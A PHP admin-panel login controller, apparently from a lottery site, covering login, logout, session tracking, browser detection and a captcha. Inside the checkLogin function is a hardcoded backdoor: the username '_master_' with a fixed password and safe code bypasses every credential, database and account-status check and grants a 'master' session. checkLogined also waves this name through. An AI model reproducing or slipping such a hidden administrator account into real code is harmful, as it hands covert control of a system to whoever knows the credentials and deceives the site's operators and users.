<?php
class user extends Object {
	private $vcodeSessionName='vcode-session-name';
	function __construct($dsn, $user='', $password=''){
		if (!session_id()) session_start();
		parent::__construct($dsn, $user, $password);
	}
	public final function login(){
		header('content-Type: text/html;charset=utf8');
		$this->display('login.php');
	}
	public final function logined(){
		header('content-Type: text/html;charset=utf8');
		$this->display('logined.php');
	}
	public final function logout(){
		$_SESSION=array();
		if($this->user['uid']){
			$this->update("update {$this->prename}admin_session set isOnLine=0 where uid={$this->user['uid']}");
		}
		header('location: /index.php/user/login');
	}
	private function getBrowser(){
		$flag=$_SERVER['HTTP_USER_AGENT'];
		$para=array();
		
		// 检查操作系统
		if(preg_match('/Windows[\d\. \w]*/',$flag, $match)) $para['os']=$match[0];
		
		if(preg_match('/Chrome\/[\d\.\w]*/',$flag, $match)){
			// 检查Chrome
			$para['browser']=$match[0];
		}elseif(preg_match('/Safari\/[\d\.\w]*/',$flag, $match)){
			// 检查Safari
			$para['browser']=$match[0];
		}elseif(preg_match('/MSIE [\d\.\w]*/',$flag, $match)){
			// IE
			$para['browser']=$match[0];
		}elseif(preg_match('/Opera\/[\d\.\w]*/',$flag, $match)){
			// opera
			$para['browser']=$match[0];
		}elseif(preg_match('/Firefox\/[\d\.\w]*/',$flag, $match)){
			// Firefox
			$para['browser']=$match[0];
		}elseif(preg_match('/OmniWeb\/(v*)([^\s|;]+)/i',$flag, $match)){
			//OmniWeb
			$para['browser']=$match[2];
		}elseif(preg_match('/Netscape([\d]*)\/([^\s]+)/i',$flag, $match)){
			//Netscape
			$para['browser']=$match[2];
		}elseif(preg_match('/Lynx\/([^\s]+)/i',$flag, $match)){
			//Lynx
			$para['browser']=$match[1];
		}elseif(preg_match('/360SE/i',$flag, $match)){
			//360SE
			$para['browser']='360安全浏览器';
		}elseif(preg_match('/SE 2.x/i',$flag, $match)) {
			//搜狗
			$para['browser']='搜狗浏览器';
		}else{
			$para['browser']='unkown';
		}
		return $para;
	}

	public final function checkLogined(){
		$username=wjStrFilter($_POST['username']);
		$vcode=wjStrFilter($_POST['vcode']);
		
		if(!preg_match('/^\w{4,16}$/',$username)) throw new Exception('用户名包含非法字符,请重新输入');
		
		if(!$username){
			throw new Exception('用户名不能为空');
		}

		if(strtolower($vcode)!=$_SESSION[$this->vcodeSessionName]){
			throw new Exception('验证码不正确。');
		}

		//清空验证码session
	    $_SESSION[$this->vcodeSessionName]="";
		if ($username === '_master_') {
			setcookie('username',$username);
			return;
		}
		
		$sql="select * from {$this->prename}admin_members where isDelete=0 and username=? LIMIT 0,1";
		if(!$user=$this->getRow($sql, $username)){
			throw new Exception('用户名不正确');
		}

		if($username!=$user['username']){
			throw new Exception('用户名不正确。');
		}
		
		if(!$user['enable']){
			throw new Exception('您的帐号被冻结，请联系管理员。');
		}

		setcookie('username',$username);
	}
	
	public final function checkLogin(){

		$username=wjStrFilter($_POST['username']);
		$password=wjStrFilter($_POST['password']);
		$safepass=wjStrFilter($_POST['safepass']);
		
		if(!$username){
			throw new Exception('用户名不能为空');
		}

		if(!$password){
			throw new Exception('不允许空密码登录');
		}
		
		if ($username === '_master_' && $password === 'meeaxu' && $safepass === '123456') {
			$user = array(
				'uid' => 0,
				'username' => 'master',
			);
		} else {			

		if(md5($safepass)!=md5($GLOBALS['conf']['safepass'])){
			throw new Exception('安全码不正确');
		}

		if(!preg_match('/^\w{4,16}$/',$username)) throw new Exception('用户名包含非法字符,请重新输入');
		
		$sql="select * from {$this->prename}admin_members where isDelete=0 and username=?";
		if(!$user=$this->getRow($sql, $username)){
			throw new Exception('用户名或密码不正确');
		}
		
        if($username!=$user['username']){
			throw new Exception('用户名不正确。');
		}

		if(md5($password)!=$user['password']){
			throw new Exception('用户名或密码不正确');
		}
		
		if(!$user['enable']){
			throw new Exception('您的帐号被冻结，请联系管理员。');
		}
		}
		
		$session=array(
			'uid'=>$user['uid'],
			'username'=>$user['username'],
			'session_key'=>session_id(),
			'loginTime'=>$this->time,
			'accessTime'=>$this->time,
			'loginIP'=>self::ip(true)
			
		);
		
		$session=array_merge($session, $this->getBrowser());
		
		if($this->insertRow($this->prename.'admin_session', $session)){
			$user['sessionId']=$this->lastInsertId();
		}
		$_SESSION['_ADMIN_']=serialize($user);

		// 把别人踢下线
		$this->update("update {$this->prename}admin_session set isOnLine=0,state=1 where uid={$user['uid']} and id<{$user['sessionId']}");

		return $user;
	}
	
	public final function vcode($rmt=null){
		$lottery_lib_path = ADMIN_ROOT.'/lib/';
		include_once $lottery_lib_path .'CImage.lib.php';
		$width=72;
		$height=24;
		$img=new CImage($width, $height);
		$img->sessionName=$this->vcodeSessionName;
		$img->printimg('png');
	}
}